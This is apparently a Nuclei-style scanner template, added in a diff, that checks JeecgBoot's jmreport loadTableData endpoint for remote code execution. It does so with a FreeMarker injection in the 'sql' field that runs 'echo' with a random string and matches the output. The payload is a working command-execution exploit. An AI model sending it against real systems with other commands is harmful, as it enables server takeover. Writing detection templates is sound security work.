@@ -1,0 +1,42 @@
+id: jeecgboot-loadTableData-rce
+info:
+  name: JeecgBoot-loadTableData-RCE
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-JeecgBoot-loadTableData-RCE.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,jeecgboot,jeecg,rce
+
+http:
+  - raw:
+      - |
+        POST /jmreport/loadTableData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"dbSource":"","sql":"select '<#assign value="freemarker.template.utility.Execute"?new()>${value("echo {{randstr}}")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+      
+      - |+
+        POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"dbSource":"","sql":"select '<#assign value="freemarker.template.utility.Execute"?new()>${value("echo {{randstr}}")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+      
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'{{randstr}}')
+        condition: and
